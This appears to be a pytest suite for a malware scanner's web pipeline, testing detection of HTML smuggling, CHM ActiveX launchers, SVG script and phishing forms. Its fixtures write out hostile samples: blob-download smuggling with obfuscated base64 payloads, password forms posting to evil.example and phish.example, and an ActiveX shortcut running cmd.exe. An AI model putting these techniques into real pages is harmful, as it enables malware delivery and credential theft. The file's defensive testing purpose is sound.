"""Tests for WebContentPipeline (Spec 014 — HTML smuggling, CHM ActiveX & SVG)."""

from __future__ import annotations

import base64
import io
import time
import zipfile
from pathlib import Path

import pytest

from malaz.analysis.clamav import ClamAVScanner
from malaz.analysis.windows_av import WindowsDefenderScanner
from malaz.core.dispatcher import Dispatcher
from malaz.models import RiskLevel


def _dispatcher() -> Dispatcher:
    return Dispatcher(
        av_scanner=WindowsDefenderScanner(enabled=False),
        clam_scanner=ClamAVScanner(enabled=False),
    )


def _scan(tmp_path: Path, name: str, data: bytes):
    p = tmp_path / name
    p.write_bytes(data)
    return _dispatcher().scan_path(p)


def _rule_ids(res) -> set[str]:
    return {i.rule_id for i in res.all_indicators()}


def _minimal_pe() -> bytes:
    buf = bytearray(256)
    buf[0:2] = b"MZ"
    buf[60:64] = (0x80).to_bytes(4, "little")
    buf[0x80:0x84] = b"PE\x00\x00"
    return bytes(buf)


def _minimal_zip() -> bytes:
    bio = io.BytesIO()
    with zipfile.ZipFile(bio, "w") as zf:
        zf.writestr("hello.txt", b"payload" * 20)
    return bio.getvalue()


def _minimal_iso() -> bytes:
    buf = bytearray(0x8020)
    buf[0x8001:0x8006] = b"CD001"
    return bytes(buf)


def _minimal_lnk() -> bytes:
    return (
        b"\x4c\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
        + b"\x00" * 120
    )


def _minimal_png() -> bytes:
    return (
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01"
        b"\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x0cIDATx\x9cc``\x00\x00"
        b"\x00\x04\x00\x01\xf6\x178U\x00\x00\x00\x00IEND\xaeB`\x82"
    )


def test_html_smuggling_classic_blob_download(tmp_path: Path) -> None:
    html_bytes = (
        b"<!DOCTYPE html><html><body><script>"
        b"var bin = atob('SGVsbG8gV29ybGQgZnJvbSBzbXVnZ2xlZCBIVE1MIQ==');"
        b"var arr = new Uint8Array(bin.length);"
        b"var blob = new Blob([arr], {type: 'application/octet-stream'});"
        b"var a = document.createElement('a');"
        b"a.href = URL.createObjectURL(blob);"
        b"a.download = 'rechnung.iso';"
        b"a.click();"
        b"</script></body></html>"
    )
    res = _scan(tmp_path, "invoice.html", html_bytes)
    assert "HTML_SMUGGLING" in _rule_ids(res)
    assert res.risk_level in (RiskLevel.YELLOW, RiskLevel.RED)
    assert res.score >= 35


@pytest.mark.parametrize(
    ("label", "payload"),
    [
        ("pe", _minimal_pe()),
        ("zip", _minimal_zip()),
        ("iso", _minimal_iso()),
        ("lnk", _minimal_lnk()),
    ],
)
def test_html_smuggled_payload_magics(tmp_path: Path, label: str, payload: bytes) -> None:
    b64 = base64.b64encode(payload).decode("ascii")
    html_bytes = f"<!DOCTYPE html><html><script>var p = '{b64}';</script></html>".encode()
    res = _scan(tmp_path, f"smug_{label}.html", html_bytes)
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res)
    assert res.risk_level == RiskLevel.RED
    assert res.score >= 50


def test_html_smuggled_payload_wrapped_concat_array_join_and_starvation(tmp_path: Path) -> None:
    # 1. Line-wrapped Base64 (76-char wrap)
    wrapped = base64.encodebytes(_minimal_zip()).decode("ascii")
    res_wrap = _scan(
        tmp_path, "wrap.html", f"<!DOCTYPE html><script>var z = `{wrapped}`;</script>".encode()
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_wrap)

    # 2. String concat '...' + '...'
    b64 = base64.b64encode(_minimal_pe()).decode("ascii")
    parts = " + ".join(f"'{b64[i:i+20]}'" for i in range(0, len(b64), 20))
    res_cat = _scan(
        tmp_path, "concat.html", f"<!DOCTYPE html><script>var p = {parts};</script>".encode()
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_cat)

    # 3. Array join ['...','...'].join('')
    arr = ",".join(f"'{b64[i:i+20]}'" for i in range(0, len(b64), 20))
    res_arr = _scan(
        tmp_path,
        "join.html",
        f"<!DOCTYPE html><script>var p = [{arr}].join('');</script>".encode(),
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_arr)

    # 4. 40 benign data:image/png;base64,... icons before the 41st malicious payload
    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
    imgs = "".join(f"<img src='data:image/png;base64,{png_b64}'>" for _ in range(40))
    res_starve = _scan(
        tmp_path,
        "starve.html",
        f"<!DOCTYPE html><body>{imgs}<script>var evil = '{b64}';</script></body>".encode(),
    )
    assert "HTML_SMUGGLED_PAYLOAD" in _rule_ids(res_starve)


def test_compact_data_html_and_svg_and_atob_depth1_recheck(tmp_path: Path) -> None:
    # 61 bytes -> 84 Base64 chars (< 128 generic threshold!)
    form_html = b'<form action="https://evil.example/post"><input type="password"></form>'
    form_b64 = base64.b64encode(form_html).decode("ascii")
    assert len(form_b64) < 128
    res = _scan(
        tmp_path,
        "iframe.html",
        f'<!DOCTYPE html><html><iframe src="data:text/html;base64,{form_b64}"></iframe></html>'.encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res)

    svg_b64 = base64.b64encode(b"<svg onload='alert(1)'/>").decode("ascii")
    res_svg = _scan(
        tmp_path,
        "img_svg.html",
        f'<!DOCTYPE html><html><object data="data:image/svg+xml;base64,{svg_b64}"></object></html>'.encode(),
    )
    assert "SVG_SCRIPT" in _rule_ids(res_svg)

    res_atob = _scan(
        tmp_path,
        "docwrite.html",
        f"<!DOCTYPE html><script>document.write(atob('{form_b64}'));</script>".encode(),
    )
    assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_atob)


def test_meta_refresh_and_chm_activex(tmp_path: Path) -> None:
    # Reversed attribute order + entity-encoded javascript:
    meta_html = (
        b'<!DOCTYPE html><html><head>'
        b'<meta content="0;url=\'&#106;avascript:alert(1)\'" http-equiv="refresh">'
        b"</head></html>"
    )
    res_meta = _scan(tmp_path, "meta.html", meta_html)
    assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(res_meta)

    for clsid in (
        "clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11",
        "CLSID:52A2AAAE-085D-4187-97EA-8C30DB990436",
    ):
        chm_html = (
            f'<!DOCTYPE html><html><body>'
            f'<OBJECT id="x" type="application/x-oleobject" classid="{clsid}">'
            f'<PARAM name="Command" value="ShortCut">'
            f'<PARAM name="Item1" value=",cmd.exe,/c calc">'
            f"</OBJECT></body></html>"
        ).encode()
        res_chm = _scan(tmp_path, f"chm_{clsid[:8]}.html", chm_html)
        assert "HTML_CHM_ACTIVEX" in _rule_ids(res_chm)
        assert res_chm.risk_level == RiskLevel.RED
        assert res_chm.score >= 50


def test_svg_active_content_evasions_and_utf16_e2e(tmp_path: Path) -> None:
    # Namespaced <svg:svg> + <svg:script><![CDATA[window.location=...]]>
    ns_svg = (
        b'<svg:svg xmlns:svg="http://www.w3.org/2000/svg">'
        b"<svg:script><![CDATA[window.location='https://evil.example']]></svg:script>"
        b"</svg:svg>"
    )
    res_ns = _scan(tmp_path, "ns.svg", ns_svg)
    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_ns)

    # <!DOCTYPE svg> + 5 KiB comment + onpointerenter + renamed to .txt
    padded_svg = (
        b"<?xml version='1.0'?>\n"
        b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        b"<!-- " + b"A" * 5120 + b" -->\n"
        + b'<svg xmlns="http://www.w3.org/2000/svg" onpointerenter="location=\'https://phish.example\'"/>'
    )
    res_pad = _scan(tmp_path, "disguised.txt", padded_svg)
    assert {"SVG_SCRIPT", "SVG_EXTERNAL_REDIRECT"} <= _rule_ids(res_pad)

    # SMIL <animate> with entity-encoded javascript: in `from`
    smil_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<a id="l"><animate attributeName="href" from="&#106;avascript:alert(1)"/></a>'
        b"</svg>"
    )
    res_smil = _scan(tmp_path, "smil.svg", smil_svg)
    assert "SVG_SCRIPT" in _rule_ids(res_smil)

    # <foreignObject> phishing form
    fo_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg"><foreignObject width="300" height="200">'
        b'<form xmlns="http://www.w3.org/1999/xhtml" action="https://phish.example/login">'
        b'<input type="password" name="pw"/></form></foreignObject></svg>'
    )
    res_fo = _scan(tmp_path, "phish.svg", fo_svg)
    assert {"SVG_FOREIGN_OBJECT", "HTML_CREDENTIAL_FORM"} <= _rule_ids(res_fo)

    # UTF-16 HTML (with BOM and BOM-less) end-to-end through Dispatcher
    raw_html = '<form action="https://phish.example"><input type="password"></form>'
    for suffix, enc in (("bom.html", "utf-16"), ("nobom.html", "utf-16-le")):
        res_u16 = _scan(tmp_path, suffix, raw_html.encode(enc))
        assert "HTML_CREDENTIAL_FORM" in _rule_ids(res_u16)


def test_web_parse_limit_fail_closed(tmp_path: Path) -> None:
    flood = b"<!DOCTYPE html><html><body>" + b"<a></a>" * 100_005 + b"<script>alert(1)</script></body></html>"
    res = _scan(tmp_path, "flood.html", flood)
    assert "WEB_PARSE_LIMIT" in _rule_ids(res)
    assert res.is_incomplete
    assert res.risk_level != RiskLevel.GREEN


def test_benign_html_and_svg_stay_green_zero(tmp_path: Path) -> None:
    png_b64 = base64.b64encode(_minimal_png()).decode("ascii")
    benign_cases = {
        "manual.html": (
            b"<!DOCTYPE html><html><head><title>Handbuch</title></head>"
            b"<body><h1>Kapitel 1</h1><p>Willkommen.</p></body></html>"
        ),
        "csv_export.html": (
            b"<!DOCTYPE html><html><body><script>"
            b"var csv = atob('YSxiCmMsZAo=');"
            b"var blob = new Blob([csv], {type: 'text/csv'});"
            b"var a = document.createElement('a');"
            b"a.href = URL.createObjectURL(blob);"
            b"a.download = 'export.csv';"
            b"a.click();"
            b"</script></body></html>"
        ),
        "local_login.html": (
            b'<!DOCTYPE html><html><body>'
            b'<form action="/login" method="post"><input type="password" name="pw"></form>'
            b"</body></html>"
        ),
        "https_refresh.html": (
            b'<!DOCTYPE html><html><head>'
            b'<meta http-equiv="refresh" content="5;url=https://example.org/docs">'
            b"</head></html>"
        ),
        "drawio_diagram.svg": (
            b'<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">'
            b'<foreignObject width="200" height="50">'
            b'<div xmlns="http://www.w3.org/1999/xhtml">Architecture Node</div>'
            b"</foreignObject>"
            b"<text x='10' y='90'>Location = Frankfurt; window.open() example</text>"
            b"</svg>"
        ),
        "logo.svg": (
            f'<svg xmlns="http://www.w3.org/2000/svg">'
            f'<a href="https://example.org"><image href="data:image/png;base64,{png_b64}"/></a>'
            f"</svg>"
        ).encode(),
        "invoice.xml": b'<?xml version="1.0"?><invoice><amount>42.00</amount></invoice>',
        "benign_note.hta": b"Simple documentation note without HTML or scripts.\n",
    }
    for name, content in benign_cases.items():
        res = _scan(tmp_path, name, content)
        assert res.risk_level == RiskLevel.GREEN, f"{name}: {_rule_ids(res)}"
        assert res.score == 0, f"{name}: score={res.score}, rules={_rule_ids(res)}"


def test_web_pipeline_redos_linear_runtime(tmp_path: Path) -> None:
    adv1 = b"<!DOCTYPE html>" + b"<a " * 20_000
    adv2 = b"<!DOCTYPE html><script>var s = " + b"'A'+" * 10_000 + b"'A';</script>"
    started = time.perf_counter()
    _scan(tmp_path, "adv1.html", adv1)
    _scan(tmp_path, "adv2.html", adv2)
    elapsed = time.perf_counter() - started
    assert elapsed < 3.0, f"Adversarial HTML took too long: {elapsed:.2f}s"
